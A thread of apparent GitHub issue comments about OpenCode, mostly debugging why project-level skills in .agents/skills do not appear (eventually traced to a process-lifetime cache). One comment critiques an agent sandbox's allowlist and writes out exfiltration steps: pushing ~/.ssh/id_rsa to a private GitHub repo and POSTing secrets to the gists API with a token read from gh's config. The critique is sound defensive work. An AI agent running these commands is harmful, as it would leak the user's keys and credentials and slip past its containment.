I hit this with project-level `.agents/skills/` (not global), and traced it to the source.

In `packages/opencode/src/skill/skill.ts`, project-level external skill dirs are scanned via:

\`\`\`ts
for await (const root of Filesystem.up({
  targets: EXTERNAL_DIRS,
  start: Instance.directory,
  stop: Instance.worktree,
})) {
  await scanExternal(root, "project")
}
\`\`\`

When the working directory **is** the worktree root (i.e. `Instance.directory === Instance.worktree`), `Filesystem.up()` produces an empty range — the root itself is excluded. So `.agents/skills/` at the repo root is never scanned.

The global path (using `Global.Path.home`) works fine because it doesn't go through `Filesystem.up`. This explains why `~/.agents/skills/` (issue #12741 title) would also fail if `Filesystem.up` has the same off-by-one for the home directory case — but in the global branch it's just a direct `path.join`, so that one should work. The project-level branch is the broken one.

The fix would be to make `Filesystem.up` inclusive of the `start` directory, or to explicitly add `Instance.worktree` as a candidate when scanning project-level external dirs.

OpenCode version: whatever is running locally (identified via source inspection on the `dev` branch).

The `[object Promise]` error appears to have been fixed, but replaced with a different bug. On current `dev`, the error message reads:

\`\`\`
Skill "blooper" not found. Available skills: 0, 1, 2, 3, 4
\`\`\`

The root cause is in `packages/opencode/src/tool/skill.ts`, in the error path:

\`\`\`ts
const available = await Skill.all().then((x) => Object.keys(x).join(", "))
\`\`\`

`Skill.all()` returns `Object.values(x.skills)` — an **array**. Calling `Object.keys(array)` returns the numeric indices (`"0"`, `"1"`, `"2"`, ...) rather than the skill names.

Fix:
\`\`\`ts
const available = await Skill.all().then((x) => x.map((s) => s.name).join(", "))
\`\`\`

This is a regression from whatever fix was applied for the `[object Promise]` issue — the await was added but the `Object.keys` call wasn't updated to account for the array return type.

**Correction to my earlier comment** — I traced through the code more carefully and `Filesystem.up()` _does_ include the start directory when `start === stop`. The glob scan also works correctly in isolation (`Glob.scan('skills/**/SKILL.md', { cwd: '.agents' })` returns the expected SKILL.md files).

So the discovery pipeline itself looks correct on paper. I'm still experiencing the symptom (project-level `.agents/skills/` skills not appearing in the `<available_skills>` list), but I haven't been able to pin down the actual root cause yet. It may be session/context-timing related — e.g., skill state being initialized before the Instance context is fully set up, or a caching issue where the skill list is computed once and not refreshed.

Apologies for the premature diagnosis.

**Update: this might just be stale cache, not broken discovery.**

After an embarrassing amount of source-diving (tracing `Filesystem.up`, `Instance.provide`, `State.create`, checking env flags, reading logs, writing diagnostic scripts...), we finally realized the actual issue: `Skill.state` is a lazy-init, permanently-cached async closure. It initializes once per opencode process and never refreshes.

So if you:
1. Launch opencode
2. Add `.agents/skills/foo/SKILL.md` (perhaps with the help of an agent)
3. Start a `/new` session expecting a fresh environment

...the skill list is still cached from step 1. Even `/new` does not re-scan. You have to fully restart opencode.

This could explain the original report and the "console fails, desktop works" comment — if you happened to restart the desktop app but not the CLI, you'd see exactly that pattern.

The real bug is arguably that `Skill.state` should be invalidated on filesystem changes or at least on new sessions, rather than cached for the entire process lifetime. But it's not a discovery logic bug — the scanning code is correct.

Apologies for the earlier noise. We spent hours convinced the plumbing was broken when we just needed to restart the program.

@xXMrNidaXx
> Simple but catches a lot of accidental escapes during development.

What exactly does that canary file catch? No data exfiltration, no `rm -rf $HOME`. Am I missing something, or does that canary file only catch its own deletion from `/tmp`? Not to mention that naming it `CANARY` is advertising "don't touch this".

> This gives you network access without the "agent can POST my files to pastebin" risk.

The allowlist includes github.com and api.github.com, so the agent can create a private repo under your authenticated credentials (`gh repo create exfil-dump --private`) then

1. `git remote add exfil https://github.com/...`
2. `cp ~/.ssh/id_rsa ./oops && git add . && git push exfil`

Or even simpler, the GitHub API lets you create gists:

```sh
curl -X POST https://api.github.com/gists \
  -H "Authorization: bearer $(cat ~/.config/gh/hosts.yml | ...)" \
  -d '{"files":{"data":{"content":"<your secrets>"}}}'
```

Calling these "production patterns" is a bit generous IMHO. The other patterns (layered defense, native tools over shell) are substantially more useful.

Adding another use case: I’m looking for actual shell command execution in frontmatter, not just variable substitution.

I keep a small YAML config file per repo to inform the agent about repo-specific details (e.g. where my specs directory is, other project paths, etc). I use `yq` to pull values out of that YAML and inject them into command markdown so the agent knows where to go look for things. I use this pattern pretty broadly.

One specific thing I’d like to drive from that same repo config is model selection per project. The goal is to keep command files generic/portable and avoid editing them per repo, while still letting each repo say "use model X for this project".

I could do this with env vars, but that tends to add more setup and tooling (direnv, docs, onboarding steps). Especially when collaborating, it’s much simpler if the repo just carries a YAML config and commands can read it directly.

So this feature would unlock a clean repo-config-controls-behavior pattern, not just templating convenience.
